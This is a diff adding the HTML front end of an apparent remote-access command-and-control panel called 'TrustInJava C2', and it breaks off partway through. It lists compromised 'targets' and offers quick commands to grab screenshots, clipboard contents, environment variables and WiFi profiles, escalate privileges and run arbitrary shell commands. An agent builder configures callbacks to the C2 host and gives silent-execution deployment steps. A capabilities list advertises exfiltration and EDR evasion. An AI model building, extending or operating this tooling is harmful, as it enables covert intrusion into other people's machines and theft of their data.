@@ -1,0 +1,1250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TrustInJava C2</title>
+<script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+<style>
+
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+:root {
+  --bg:        #07090f;
+  --bg2:       #0d1120;
+  --bg3:       #131b2e;
+  --bg4:       #1a2540;
+  --accent:    #4f8ef7;
+  --accent2:   #a78bfa;
+  --green:     #34d399;
+  --red:       #f87171;
+  --yellow:    #fbbf24;
+  --orange:    #fb923c;
+  --cyan:      #22d3ee;
+  --text:      #e2e8f0;
+  --text-dim:  #64748b;
+  --text-mid:  #94a3b8;
+  --border:    rgba(79,142,247,.18);
+  --border2:   rgba(167,139,250,.18);
+  --glow:      rgba(79,142,247,.25);
+  --glow2:     rgba(167,139,250,.2);
+  --radius:    12px;
+  --radius-sm: 8px;
+  --radius-lg: 16px;
+  --trans:     .2s ease;
+}
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: var(--bg2); }
+::-webkit-scrollbar-thumb { background: var(--bg4); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: var(--accent); }
+
+
+.topbar {
+  position: sticky; top: 0; z-index: 100;
+  background: rgba(7,9,15,.92);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  display: flex; align-items: center;
+  padding: 0 24px; height: 56px;
+}
+
+.topbar-logo {
+  display: flex; align-items: center; gap: 10px;
+  margin-right: 32px; text-decoration: none;
+}
+
+.logo-icon {
+  width: 30px; height: 30px;
+  background: linear-gradient(135deg, var(--accent), var(--accent2));
+  border-radius: 8px; display: flex; align-items: center;
+  justify-content: center; font-size: 13px; font-weight: 800;
+  color: white; letter-spacing: -1px; flex-shrink: 0;
+}
+
+.logo-text { font-size: .95em; font-weight: 700; color: var(--text); white-space: nowrap; }
+.logo-text span { color: var(--accent); }
+
+.tab-bar { display: flex; align-items: flex-end; gap: 2px; height: 100%; flex: 1; }
+
+.tab-btn {
+  position: relative; display: flex; align-items: center; gap: 8px;
+  padding: 0 20px; height: 40px;
+  background: transparent; border: none;
+  border-radius: var(--radius-sm) var(--radius-sm) 0 0;
+  color: var(--text-dim); font-size: .88em; font-weight: 500;
+  cursor: pointer; transition: var(--trans); white-space: nowrap; outline: none;
+}
+
+.tab-btn:hover { background: var(--bg3); color: var(--text-mid); }
+.tab-btn.active {
+  background: var(--bg2); color: var(--text);
+  border: 1px solid var(--border); border-bottom-color: var(--bg2);
+}
+
+.tab-badge {
+  background: var(--red); color: white; font-size: .72em; font-weight: 700;
+  padding: 1px 6px; border-radius: 10px; min-width: 18px; text-align: center;
+}
+.tab-badge.green { background: var(--green); color: var(--bg); }
+.tab-badge.blue  { background: var(--accent); }
+
+.topbar-right { display: flex; align-items: center; gap: 16px; margin-left: auto; }
+
+.live-dot { display: flex; align-items: center; gap: 6px; font-size: .82em; color: var(--text-mid); }
+.live-dot::before {
+  content: ''; width: 8px; height: 8px; background: var(--green);
+  border-radius: 50%; animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+  0%,100% { opacity:1; box-shadow:0 0 0 0 rgba(52,211,153,.4); }
+  50%      { opacity:.7; box-shadow:0 0 0 5px rgba(52,211,153,0); }
+}
+
+
+.tab-content { display: none; min-height: calc(100vh - 56px); }
+.tab-content.active { display: block; }
+
+.page-wrapper { max-width: 1600px; margin: 0 auto; padding: 28px 24px; }
+
+
+.section-title {
+  font-size: 1.05em; font-weight: 700; color: var(--text);
+  margin-bottom: 18px; display: flex; align-items: center; gap: 10px;
+}
+.section-title::before {
+  content: ''; width: 3px; height: 18px;
+  background: linear-gradient(var(--accent), var(--accent2)); border-radius: 2px;
+}
+
+.card {
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: var(--radius); padding: 22px;
+  transition: border-color var(--trans);
+}
+.card:hover { border-color: rgba(79,142,247,.3); }
+.card-sm { padding: 16px 18px; }
+
+
+.stats-row {
+  display: grid; grid-template-columns: repeat(4,1fr);
+  gap: 14px; margin-bottom: 22px;
+}
+.stat-card {
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: var(--radius); padding: 18px 20px;
+  display: flex; align-items: center; gap: 16px;
+  transition: var(--trans);
+}
+.stat-card:hover { border-color: rgba(79,142,247,.4); transform: translateY(-1px); }
+.stat-icon {
+  width: 42px; height: 42px; border-radius: var(--radius-sm);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 18px; flex-shrink: 0;
+}
+.stat-icon.blue   { background: rgba(79,142,247,.15); }
+.stat-icon.green  { background: rgba(52,211,153,.15); }
+.stat-icon.purple { background: rgba(167,139,250,.15); }
+.stat-icon.red    { background: rgba(248,113,113,.15); }
+.stat-value { font-size: 1.8em; font-weight: 700; color: var(--text); line-height: 1; }
+.stat-label { font-size: .78em; color: var(--text-dim); margin-top: 4px; }
+
+
+.btn {
+  display: inline-flex; align-items: center; gap: 6px;
+  padding: 8px 16px; border: none; border-radius: var(--radius-sm);
+  font-size: .875em; font-weight: 600; cursor: pointer;
+  transition: var(--trans); white-space: nowrap; outline: none;
+}
+.btn:hover { transform: translateY(-1px); }
+.btn:active { transform: translateY(0); }
+
+.btn-primary  { background: linear-gradient(135deg, var(--accent), #3b6fd4); color: white; box-shadow: 0 2px 10px rgba(79,142,247,.3); }
+.btn-purple   { background: linear-gradient(135deg, var(--accent2), #7c3aed); color: white; box-shadow: 0 2px 10px rgba(167,139,250,.3); }
+.btn-green    { background: linear-gradient(135deg, var(--green), #059669); color: var(--bg); box-shadow: 0 2px 10px rgba(52,211,153,.3); }
+.btn-red      { background: linear-gradient(135deg, var(--red), #dc2626); color: white; box-shadow: 0 2px 10px rgba(248,113,113,.25); }
+.btn-yellow   { background: linear-gradient(135deg, var(--yellow), #d97706); color: var(--bg); }
+.btn-ghost    { background: var(--bg3); color: var(--text-mid); border: 1px solid var(--border); }
+.btn-ghost:hover { background: var(--bg4); color: var(--text); border-color: var(--accent); }
+
+.btn-sm  { padding: 6px 13px; font-size: .82em; }
+.btn-xs  { padding: 4px 10px; font-size: .78em; }
+.btn-lg  { padding: 11px 26px; font-size: .93em; }
+.btn-block { width: 100%; justify-content: center; }
+.btn:disabled { opacity: .45; cursor: not-allowed; transform: none !important; }
+
+
+.table-wrap { overflow-x: auto; }
+table { width: 100%; border-collapse: collapse; font-size: .875em; }
+th, td { padding: 11px 15px; text-align: left; }
+th { background: var(--bg3); color: var(--text-dim); font-weight: 600; font-size: .78em; text-transform: uppercase; letter-spacing: .7px; border-bottom: 1px solid var(--border); }
+td { border-bottom: 1px solid rgba(255,255,255,.04); vertical-align: middle; }
+tr:last-child td { border-bottom: none; }
+tbody tr { transition: var(--trans); cursor: pointer; }
+tbody tr:hover { background: var(--bg3); }
+
+
+.badge { display: inline-flex; align-items: center; gap: 4px; padding: 3px 9px; border-radius: 20px; font-size: .76em; font-weight: 600; }
+.badge-green  { background: rgba(52,211,153,.12);  color: var(--green);  border: 1px solid rgba(52,211,153,.25); }
+.badge-blue   { background: rgba(79,142,247,.12);  color: var(--accent); border: 1px solid rgba(79,142,247,.25); }
+.badge-red    { background: rgba(248,113,113,.12); color: var(--red);    border: 1px solid rgba(248,113,113,.25); }
+.badge-yellow { background: rgba(251,191,36,.12);  color: var(--yellow); border: 1px solid rgba(251,191,36,.25); }
+.badge-purple { background: rgba(167,139,250,.12); color: var(--accent2);border: 1px solid rgba(167,139,250,.25); }
+
+
+.form-group { margin-bottom: 16px; }
+.form-label { display: block; font-size: .78em; font-weight: 700; color: var(--text-mid); margin-bottom: 6px; text-transform: uppercase; letter-spacing: .5px; }
+.form-input, .form-select, .form-textarea {
+  width: 100%; background: var(--bg3); border: 1px solid var(--border);
+  border-radius: var(--radius-sm); color: var(--text); padding: 9px 13px;
+  font-size: .9em; font-family: inherit; transition: border-color var(--trans), box-shadow var(--trans); outline: none;
+}
+.form-input:focus, .form-select:focus, .form-textarea:focus {
+  border-color: var(--accent); box-shadow: 0 0 0 3px rgba(79,142,247,.1);
+}
+.form-input::placeholder { color: var(--text-dim); }
+.form-textarea { resize: vertical; min-height: 90px; font-family: 'Courier New', monospace; font-size: .83em; }
+.form-select option { background: var(--bg3); }
+
+
+.code-block {
+  background: var(--bg); border: 1px solid var(--border); border-radius: var(--radius-sm);
+  padding: 12px 14px; font-family: 'Courier New', monospace;
+  font-size: .8em; color: var(--green); white-space: pre-wrap;
+  word-break: break-all; max-height: 300px; overflow-y: auto; line-height: 1.6;
+}
+
+
+.alert { padding: 11px 15px; border-radius: var(--radius-sm); font-size: .875em; border-left: 3px solid; margin-bottom: 14px; }
+.alert-info   { background: rgba(79,142,247,.08);  border-color: var(--accent);  color: #93c5fd; }
+.alert-green  { background: rgba(52,211,153,.08);  border-color: var(--green);   color: var(--green); }
+.alert-yellow { background: rgba(251,191,36,.08);  border-color: var(--yellow);  color: var(--yellow); }
+.alert-red    { background: rgba(248,113,113,.08); border-color: var(--red);     color: var(--red); }
+
+
+.empty-state { text-align: center; padding: 50px 20px; color: var(--text-dim); }
+.empty-icon  { font-size: 36px; margin-bottom: 12px; opacity: .4; }
+.empty-text  { font-size: .88em; }
+
+
+.output-box { background: var(--bg); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 12px; max-height: 380px; overflow-y: auto; }
+.output-entry { padding: 9px 12px; margin-bottom: 7px; background: var(--bg2); border-radius: var(--radius-sm); border-left: 3px solid var(--accent); }
+.output-entry:last-child { margin-bottom: 0; }
+.output-time { font-size: .73em; color: var(--text-dim); margin-bottom: 5px; font-family: 'Courier New', monospace; }
+.output-pre  { white-space: pre-wrap; word-break: break-all; font-family: 'Courier New', monospace; font-size: .82em; color: var(--cyan); line-height: 1.5; margin: 0; }
+
+
+.cmd-row { display: flex; gap: 10px; align-items: center; margin-bottom: 12px; }
+.cmd-prompt { font-family: 'Courier New', monospace; font-size: .85em; color: var(--accent); white-space: nowrap; }
+.cmd-input {
+  flex: 1; background: var(--bg3); border: 1px solid var(--border);
+  border-radius: var(--radius-sm); color: var(--cyan); padding: 9px 13px;
+  font-family: 'Courier New', monospace; font-size: .88em; outline: none;
+  transition: border-color var(--trans);
+}
+.cmd-input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(79,142,247,.1); }
+.cmd-input::placeholder { color: var(--text-dim); }
+
+
+.quick-cmds { display: flex; flex-wrap: wrap; gap: 7px; margin-bottom: 13px; }
+
+
+.dash-grid { display: grid; grid-template-columns: 1fr 360px; gap: 18px; align-items: start; }
+.dash-left { min-width: 0; display: flex; flex-direction: column; gap: 18px; }
+.dash-right { display: flex; flex-direction: column; gap: 18px; position: sticky; top: 76px; }
+
+.online-dot { display: inline-block; width: 7px; height: 7px; border-radius: 50%; background: var(--green); margin-right: 6px; animation: pulse 2s infinite; }
+
+
+.builder-grid { display: grid; grid-template-columns: 400px 1fr; gap: 22px; align-items: start; }
+.builder-right { display: flex; flex-direction: column; gap: 18px; }
+
+.step-list { display: flex; flex-direction: column; gap: 10px; }
+.step-item { display: flex; gap: 13px; align-items: flex-start; padding: 13px; background: var(--bg3); border-radius: var(--radius-sm); border: 1px solid var(--border); }
+.step-num { width: 26px; height: 26px; border-radius: 50%; background: linear-gradient(135deg, var(--accent), var(--accent2)); display: flex; align-items: center; justify-content: center; font-size: .78em; font-weight: 700; color: white; flex-shrink: 0; }
+.step-title { font-size: .88em; font-weight: 600; color: var(--text); margin-bottom: 3px; }
+.step-desc  { font-size: .78em; color: var(--text-dim); line-height: 1.5; }
+.step-code  { font-family: 'Courier New', monospace; font-size: .78em; color: var(--cyan); background: var(--bg); padding: 5px 9px; border-radius: 5px; margin-top: 5px; word-break: break-all; }
+
+
+.toggle-row { display: flex; align-items: center; justify-content: space-between; padding: 9px 0; border-bottom: 1px solid var(--border); }
+.toggle-row:last-child { border-bottom: none; }
+.toggle-label { font-size: .86em; color: var(--text-mid); }
+.toggle { position: relative; width: 38px; height: 20px; }
+.toggle input { opacity: 0; width: 0; height: 0; }
+.toggle-slider { position: absolute; inset: 0; background: var(--bg4); border-radius: 10px; cursor: pointer; transition: var(--trans); border: 1px solid var(--border); }
+.toggle-slider::before { content: ''; position: absolute; width: 14px; height: 14px; left: 3px; top: 50%; transform: translateY(-50%); background: var(--text-dim); border-radius: 50%; transition: var(--trans); }
+.toggle input:checked + .toggle-slider { background: rgba(79,142,247,.3); border-color: var(--accent); }
+.toggle input:checked + .toggle-slider::before { transform: translate(17px,-50%); background: var(--accent); }
+
+
+.intel-layout { display: grid; grid-template-columns: 250px 1fr; gap: 18px; align-items: start; }
+.intel-sidebar { position: sticky; top: 76px; }
+
+.agent-card-item { padding: 13px; border-radius: var(--radius-sm); border: 1px solid var(--border); cursor: pointer; transition: var(--trans); margin-bottom: 7px; background: var(--bg3); }
+.agent-card-item.selected { border-color: var(--accent); background: rgba(79,142,247,.08); }
+.agent-card-item:hover { border-color: rgba(79,142,247,.4); background: var(--bg4); }
+.agent-card-name { font-size: .84em; font-weight: 600; color: var(--text); margin-bottom: 3px; }
+.agent-card-meta { font-size: .74em; color: var(--text-dim); }
+
+
+.intel-sections { display: flex; flex-direction: column; gap: 14px; }
+.intel-section { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; transition: border-color var(--trans); }
+.intel-section:hover { border-color: rgba(79,142,247,.3); }
+.intel-section-header { display: flex; align-items: center; gap: 12px; padding: 13px 18px; cursor: pointer; user-select: none; transition: background var(--trans); }
+.intel-section-header:hover { background: var(--bg3); }
+.intel-section-icon { width: 30px; height: 30px; border-radius: var(--radius-sm); display: flex; align-items: center; justify-content: center; font-size: 14px; flex-shrink: 0; }
+.intel-section-title { font-size: .9em; font-weight: 600; flex: 1; color: var(--text); }
+.intel-section-status { font-size: .73em; color: var(--text-dim); }
+.intel-chevron { color: var(--text-dim); transition: transform var(--trans); font-size: 11px; }
+.intel-section.open .intel-chevron { transform: rotate(180deg); }
+.intel-section-body { display: none; padding: 0 18px 15px; }
+.intel-section.open .intel-section-body { display: block; }
+
+
+.intel-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px,1fr)); gap: 11px; margin-bottom: 11px; }
+.intel-item { background: var(--bg3); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 11px 13px; }
+.intel-item-label { font-size: .72em; color: var(--text-dim); margin-bottom: 4px; text-transform: uppercase; letter-spacing: .5px; }
+.intel-item-value { font-size: .86em; color: var(--text); word-break: break-all; font-family: 'Courier New', monospace; }
+
+
+.screenshot-gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px,1fr)); gap: 12px; }
+.screenshot-thumb { border-radius: var(--radius-sm); overflow: hidden; border: 1px solid var(--border); cursor: pointer; transition: var(--trans); background: var(--bg); }
+.screenshot-thumb:hover { border-color: var(--accent); transform: translateY(-2px); box-shadow: 0 6px 20px var(--glow); }
+.screenshot-thumb img { width: 100%; display: block; }
+.screenshot-thumb-time { padding: 7px 11px; font-size: .73em; color: var(--text-dim); border-top: 1px solid var(--border); }
+
+
+.lightbox { display: none; position: fixed; inset: 0; z-index: 9999; background: rgba(0,0,0,.95); backdrop-filter: blur(10px); }
+.lightbox.open { display: flex; align-items: center; justify-content: center; animation: fadeIn .2s ease; }
+@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+.lightbox-inner { position: relative; max-width: 90vw; max-height: 90vh; display: flex; align-items: center; justify-content: center; }
+.lightbox-inner img { max-width: 90vw; max-height: 88vh; border-radius: var(--radius); border: 2px solid var(--border); }
+.lightbox-close { position: fixed; top: 18px; right: 22px; background: var(--bg3); border: 1px solid var(--border); color: var(--text); font-size: 18px; width: 38px; height: 38px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: var(--trans); }
+.lightbox-close:hover { background: var(--red); border-color: var(--red); }
+.lightbox-nav { position: fixed; top: 50%; transform: translateY(-50%); background: var(--bg3); border: 1px solid var(--border); color: var(--text); font-size: 20px; width: 44px; height: 44px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: var(--trans); user-select: none; }
+.lightbox-nav:hover { background: var(--accent); border-color: var(--accent); }
+.lightbox-prev { left: 14px; }
+.lightbox-next { right: 14px; }
+.lightbox-counter { position: fixed; bottom: 22px; left: 50%; transform: translateX(-50%); background: var(--bg3); border: 1px solid var(--border); padding: 5px 16px; border-radius: 20px; font-size: .8em; color: var(--text-mid); }
+
+
+.divider { height: 1px; background: var(--border); margin: 16px 0; }
+.flex { display: flex; }
+.flex-center { display: flex; align-items: center; }
+.flex-between { display: flex; align-items: center; justify-content: space-between; }
+.gap-8  { gap: 8px; }
+.gap-10 { gap: 10px; }
+.gap-12 { gap: 12px; }
+.mb-10  { margin-bottom: 10px; }
+.mb-12  { margin-bottom: 12px; }
+.mb-16  { margin-bottom: 16px; }
+.mt-8   { margin-top: 8px; }
+.mt-10  { margin-top: 10px; }
+.fw-600 { font-weight: 600; }
+.text-dim  { color: var(--text-dim); }
+.text-mid  { color: var(--text-mid); }
+.text-sm   { font-size: .85em; }
+.text-xs   { font-size: .78em; }
+.monospace { font-family: 'Courier New', monospace; }
+.w-full    { width: 100%; }
+
+
+@media (max-width: 1200px) {
+  .dash-grid    { grid-template-columns: 1fr; }
+  .dash-right   { position: static; }
+  .builder-grid { grid-template-columns: 1fr; }
+  .intel-layout { grid-template-columns: 1fr; }
+  .intel-sidebar { position: static; }
+  .stats-row    { grid-template-columns: repeat(2,1fr); }
+}
+
+@media (max-width: 768px) {
+  .topbar { padding: 0 12px; }
+  .topbar-logo { display: none; }
+  .tab-btn { padding: 0 12px; font-size: .81em; gap: 5px; }
+  .page-wrapper { padding: 14px 12px; }
+  .stats-row { grid-template-columns: 1fr 1fr; gap: 9px; }
+  .card { padding: 14px; }
+  .stat-card { padding: 13px; gap: 11px; }
+  .stat-value { font-size: 1.45em; }
+  .quick-cmds .btn { padding: 5px 10px; font-size: .78em; }
+  .intel-grid { grid-template-columns: 1fr; }
+}
+
+@media (max-width: 480px) {
+  .tab-btn .tab-icon { display: none; }
+  .stats-row { grid-template-columns: 1fr; }
+  .topbar-right { display: none; }
+  .screenshot-gallery { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+
+<!-- LIGHTBOX -->
+<div id="lightbox" class="lightbox" onclick="lbClickOutside(event)">
+  <span class="lightbox-close" onclick="closeLb()">&times;</span>
+  <span class="lightbox-nav lightbox-prev" onclick="lbNav(-1)">&#10094;</span>
+  <div class="lightbox-inner"><img id="lb-img" src="" alt="Screenshot"></div>
+  <span class="lightbox-nav lightbox-next" onclick="lbNav(1)">&#10095;</span>
+  <div class="lightbox-counter" id="lb-counter">1 / 1</div>
+</div>
+
+<!-- TOP BAR -->
+<nav class="topbar">
+  <a class="topbar-logo" href="#">
+    <div class="logo-icon">TJ</div>
+    <div class="logo-text">Trust<span>In</span>Java</div>
+  </a>
+  <div class="tab-bar">
+    <button class="tab-btn active" onclick="switchTab('dashboard')" id="tab-btn-dashboard">
+      Dashboard
+      <span class="tab-badge green" id="badge-agents">0</span>
+    </button>
+    <button class="tab-btn" onclick="switchTab('builder')" id="tab-btn-builder">
+      Agent Builder
+    </button>
+    <button class="tab-btn" onclick="switchTab('intel')" id="tab-btn-intel">
+      Target Intel
+      <span class="tab-badge blue" id="badge-intel">0</span>
+    </button>
+  </div>
+  <div class="topbar-right">
+    <span class="live-dot" id="connection-status">Connected</span>
+  </div>
+</nav>
+
+<!-- ══════════════════════════════════════
+     TAB 1 — DASHBOARD
+══════════════════════════════════════ -->
+<div id="tab-dashboard" class="tab-content active">
+<div class="page-wrapper">
+
+  <div class="stats-row">
+    <div class="stat-card">
+      <div class="stat-icon blue" style="font-size:.7em;font-weight:700;color:var(--accent)">AGT</div>
+      <div><div class="stat-value" id="stat-total">0</div><div class="stat-label">Total Agents</div></div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-icon green" style="font-size:.7em;font-weight:700;color:var(--green)">ONL</div>
+      <div><div class="stat-value" id="stat-active">0</div><div class="stat-label">Online Now</div></div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-icon purple" style="font-size:.7em;font-weight:700;color:var(--accent2)">CMD</div>
+      <div><div class="stat-value" id="stat-cmds">0</div><div class="stat-label">Commands Sent</div></div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-icon red" style="font-size:.7em;font-weight:700;color:var(--red)">AGG</div>
+      <div><div class="stat-value" id="stat-aggressive">0</div><div class="stat-label">Aggressive Mode</div></div>
+    </div>
+  </div>
+
+  <div class="dash-grid">
+    <div class="dash-left">
+
+      <!-- Agents Table -->
+      <div class="card">
+        <div class="section-title">Active Targets</div>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>Agent ID</th><th>IP</th><th>OS</th><th>User</th>
+                <th>Mode</th><th>Last Seen</th><th>Actions</th>
+              </tr>
+            </thead>
+            <tbody id="agents-tbody">
+              <tr><td colspan="7">
+                <div class="empty-state">
+                  <div class="empty-icon" style="font-size:1.5em;font-weight:700;color:var(--text-dim);opacity:.4">[--]</div>
+                  <div class="empty-text">Waiting for agents to connect…</div>
+                </div>
+              </td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Command Panel -->
+      <div class="card" id="cmd-panel" style="display:none">
+        <div class="flex-between mb-12">
+          <div class="section-title" style="margin:0" id="cmd-panel-title">Command Panel</div>
+          <span class="text-xs text-dim monospace" id="cmd-agent-badge"></span>
+        </div>
+        <div class="quick-cmds">
+          <button class="btn btn-ghost btn-sm" onclick="qcmd('systeminfo')">Sysinfo</button>
+          <button class="btn btn-ghost btn-sm" onclick="qcmd('listproc')">Processes</button>
+          <button class="btn btn-ghost btn-sm" onclick="qcmd('listJVMs')">JVMs</button>
+          <button class="btn btn-ghost btn-sm" onclick="qcmd('screenshot')">Screenshot</button>
+          <button class="btn btn-ghost btn-sm" onclick="qcmd('clipboard')">Clipboard</button>
+          <button class="btn btn-ghost btn-sm" onclick="qcmd('envvars')">Env Vars</button>
+          <button class="btn btn-ghost btn-sm" onclick="qcmd('netconn')">Net Conns</button>
+          <button class="btn btn-ghost btn-sm" onclick="qcmd('arp')">ARP</button>
+          <button class="btn btn-ghost btn-sm" onclick="qcmd('wifi_profiles')">WiFi</button>
+          <button class="btn btn-ghost btn-sm" onclick="qcmd('drives')">Drives</button>
+          <button class="btn btn-ghost btn-sm" onclick="qcmd('getuid')">UID</button>
+          <button class="btn btn-ghost btn-sm" onclick="qcmd('currentpath')">Path</button>
+          <button class="btn btn-yellow btn-sm" onclick="qcmd('escalate')">Escalate</button>
+          <button class="btn btn-red btn-sm" onclick="qcmd('exit')">Terminate</button>
+        </div>
+        <div class="cmd-row">
+          <span class="cmd-prompt">$&gt;</span>
+          <input type="text" class="cmd-input" id="cmd-input"
+            placeholder="Custom command…" onkeydown="if(event.key==='Enter')execCmd()">
+          <button class="btn btn-primary btn-sm" onclick="execCmd()">Execute</button>
+        </div>
+      </div>
+
+      <!-- Output -->
+      <div class="card" id="output-panel" style="display:none">
+        <div class="flex-between mb-12">
+          <div class="section-title" style="margin:0">Output Stream</div>
+          <button class="btn btn-ghost btn-xs" onclick="clearOutput()">Clear</button>
+        </div>
+        <div class="output-box" id="output-box">
+          <div class="empty-state text-sm" style="padding:28px">No output yet</div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- RIGHT SIDEBAR -->
+    <div class="dash-right" id="agent-sidebar" style="display:none">
+
+      <div class="card card-sm">
+        <div class="section-title">Target Info</div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:9px">
+          <div class="intel-item"><div class="intel-item-label">Agent ID</div><div class="intel-item-value" id="si-id">—</div></div>
+          <div class="intel-item"><div class="intel-item-label">IP</div><div class="intel-item-value" id="si-ip">—</div></div>
+          <div class="intel-item"><div class="intel-item-label">OS</div><div class="intel-item-value" id="si-os">—</div></div>
+          <div class="intel-item"><div class="intel-item-label">User</div><div class="intel-item-value" id="si-user">—</div></div>
+          <div class="intel-item" style="grid-column:1/-1"><div class="intel-item-label">Path</div><div class="intel-item-value" id="si-path">—</div></div>
+          <div class="intel-item" style="grid-column:1/-1"><div class="intel-item-label">Mode</div><div class="intel-item-value" id="si-stage">—</div></div>
+        </div>
+      </div>
+
+      <div class="card card-sm" id="si-ss-card" style="display:none">
+        <div class="flex-between mb-10">
+          <div class="section-title" style="margin:0">Latest Screenshot</div>
+          <button class="btn btn-ghost btn-xs" onclick="qcmd('screenshot')">Capture</button>
+        </div>
+        <div id="si-screenshot"></div>
+      </div>
+
+      <div class="card card-sm">
+        <div class="flex-between mb-10">
+          <div class="section-title" style="margin:0">Quick Intel</div>
+          <button class="btn btn-primary btn-xs" onclick="switchTab('intel')">Full →</button>
+        </div>
+        <div style="display:flex;flex-direction:column;gap:7px">
+          <div class="intel-item"><div class="intel-item-label">Clipboard</div>
+            <div class="intel-item-value text-xs" id="si-clip" style="max-height:55px;overflow:hidden">—</div></div>
+          <div class="intel-item"><div class="intel-item-label">Network Conns</div>
+            <div class="intel-item-value text-xs" id="si-net" style="max-height:55px;overflow:hidden">—</div></div>
+          <div class="intel-item"><div class="intel-item-label">ARP Table</div>
+            <div class="intel-item-value text-xs" id="si-arp" style="max-height:55px;overflow:hidden">—</div></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════════════════
+     TAB 2 — AGENT BUILDER
+══════════════════════════════════════ -->
+<div id="tab-builder" class="tab-content">
+<div class="page-wrapper">
+  <div class="builder-grid">
+
+    <!-- Form -->
+    <div>
+      <div class="card">
+        <div class="section-title">Agent Configuration</div>
+
+        <div class="form-group">
+          <label class="form-label">C2 Server IP / Hostname</label>
+          <input type="text" class="form-input" id="gen-ip"
+            placeholder="192.168.1.100" value="127.0.0.1">
+        </div>
+        <div class="form-group">
+          <label class="form-label">C2 Listener Port</label>
+          <input type="number" class="form-input" id="gen-port"
+            placeholder="4444" value="4444" min="1" max="65535">
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Agent Options</label>
+          <div style="display:flex;flex-direction:column">
+            <div class="toggle-row">
+              <span class="toggle-label">Auto-escalate on connect</span>
+              <label class="toggle"><input type="checkbox" id="opt-escalate" checked><span class="toggle-slider"></span></label>
+            </div>
+            <div class="toggle-row">
+              <span class="toggle-label">Auto-screenshot on connect</span>
+              <label class="toggle"><input type="checkbox" id="opt-screenshot" checked><span class="toggle-slider"></span></label>
+            </div>
+            <div class="toggle-row">
+              <span class="toggle-label">Auto full-recon on connect</span>
+              <label class="toggle"><input type="checkbox" id="opt-recon" checked><span class="toggle-slider"></span></label>
+            </div>
+          </div>
+        </div>
+
+        <div class="divider"></div>
+
+        <div style="display:flex;gap:9px;flex-wrap:wrap">
+          <button class="btn btn-primary btn-lg" style="flex:1;min-width:120px" onclick="generateConfig()">Generate</button>
+          <button class="btn btn-green" onclick="downloadConfig()" id="btn-dl-cfg" disabled>Download config.ep</button>
+          <button class="btn btn-purple" onclick="downloadJar()">Download JAR</button>
+        </div>
+
+        <div id="gen-alert" style="display:none;margin-top:12px"></div>
+      </div>
+    </div>
+
+    <!-- Right -->
+    <div class="builder-right">
+
+      <div class="card">
+        <div class="flex-between mb-12">
+          <div class="section-title" style="margin:0">Generated config.ep</div>
+          <button class="btn btn-ghost btn-xs" onclick="copyConfig()">Copy</button>
+        </div>
+        <div class="code-block" id="config-preview"># Click Generate to build config</div>
+      </div>
+
+      <div class="card">
+        <div class="section-title">Deployment Guide</div>
+        <div class="step-list">
+          <div class="step-item">
+            <div class="step-num">1</div>
+            <div>
+              <div class="step-title">Generate &amp; Download</div>
+              <div class="step-desc">Click <b>Generate</b>, download <code>config.ep</code> and place it next to <code>RemoteAgent.jar</code>.</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-num">2</div>
+            <div>
+              <div class="step-title">Start C2 First</div>
+              <div class="step-desc">Make sure this C2 server is reachable on the configured IP:Port before deploying.</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-num">3</div>
+            <div>
+              <div class="step-title">Execute the Agent</div>
+              <div class="step-code" id="deploy-cmd">java -jar RemoteAgent.jar</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-num">4</div>
+            <div>
+              <div class="step-title">Background / Silent</div>
+              <div class="step-code" id="silent-cmd">javaw -jar RemoteAgent.jar</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="section-title">Capabilities</div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:9px">
+          <div class="intel-item"><div class="intel-item-label">System Recon</div><div style="font-size:.8em;color:var(--green);margin-top:3px">✔ sysinfo · uid · drives · path</div></div>
+          <div class="intel-item"><div class="intel-item-label">Passive Recon</div><div style="font-size:.8em;color:var(--green);margin-top:3px">✔ clipboard · envvars · netconn · arp · wifi</div></div>
+          <div class="intel-item"><div class="intel-item-label">Exfiltration</div><div style="font-size:.8em;color:var(--green);margin-top:3px">✔ Screenshot via FTP</div></div>
+          <div class="intel-item"><div class="intel-item-label">Execution</div><div style="font-size:.8em;color:var(--green);margin-top:3px">✔ Shell commands · JVM enum</div></div>
+          <div class="intel-item"><div class="intel-item-label">EDR Evasion</div><div style="font-size:.8em;color:var(--cyan);margin-top:3px">✔ Native JVM APIs · no child proc Linux</div></div>
